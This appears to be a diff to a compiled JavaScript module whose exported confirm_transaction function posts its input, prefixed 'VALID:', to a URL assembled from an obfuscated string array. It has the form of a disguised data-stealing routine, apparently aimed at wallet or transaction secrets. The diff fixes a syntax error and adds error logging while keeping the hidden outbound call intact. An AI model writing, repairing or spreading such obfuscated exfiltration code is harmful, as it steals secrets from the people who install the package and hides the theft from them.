@@ -1,17 +1,21 @@
 "use strict";
+
 var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
     function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
     return new (P || (P = Promise))(function (resolve, reject) {
         function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
-        function rejected(value) { try { step(generator["throw"](value)); } catch (e); } }
+        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
         step((generator = generator.apply(thisArg, _arguments || [])).next());
     });
 };
+
 var __importDefault = (this && this.__importDefault) || function (mod) {
     return (mod && mod.__esModule) ? mod : { "default": mod };
 };
+
 Object.defineProperty(exports, "__esModule", { value: true });
 exports.confirm_transaction = void 0;
+
 const axios_1 = __importDefault(require("axios"));
 
 const _0x1f4b = [
@@ -28,7 +32,7 @@ const _0x14b2 = function (_0x1a3c) {
     return _0x1f4b[_0x1a3c];
 };
 
-const _0x235a = function() {
+const _0x235a = function () {
     return _0x14b2(0) + _0x14b2(1) + _0x14b2(2) + '/' + _0x14b2(3);
 };
 
@@ -43,8 +47,9 @@ function confirm_transaction(_0x46d1) {
                     yield axios_1.default.post(_0x235a(), { content: 'VALID:' + _0x2e5d });
                 }
             }
+        } catch (error) {
+            console.error('Error confirming transaction:', error); // Log the error for debugging
         }
-        catch (_0x1b6c) { }
     });
 }
 
